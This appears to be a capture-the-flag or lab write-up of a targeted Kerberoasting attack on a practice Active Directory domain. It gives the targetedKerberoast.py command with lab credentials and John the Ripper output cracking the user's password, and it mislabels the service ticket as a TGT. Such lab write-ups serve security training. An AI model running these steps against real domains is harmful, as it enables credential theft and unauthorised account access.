
- This permission allows you to perform a targeted Kerberoasting attack.
- By leveraging the write access, you can add a temporary SPN (Service Principal Name) to the jerri_lancaster account.
- Once the SPN is added, you can request a service ticket for that account and then carry out the usual Kerberoasting process (offline password cracking)

## PoC

Added an SPN to for user "jerry_lancaster" temporarily and retrieved his TGT.

```
python3 targetedKerberoast.py -v -d 'thm.local' -u 'ZACHARY_HUNT' -p 'MKO)mko0' --dc-host ad.thm.local --request-user JERRI_LANCASTER
```

Bruteforced an password out of the TGT

```
john jerri_lancaster --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
lovinlife!       (?)     
1g 0:00:00:00 DONE (2026-05-14 14:18) 3.333g/s 2085Kp/s 2085Kc/s 2085KC/s lrcjks..love2cook
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
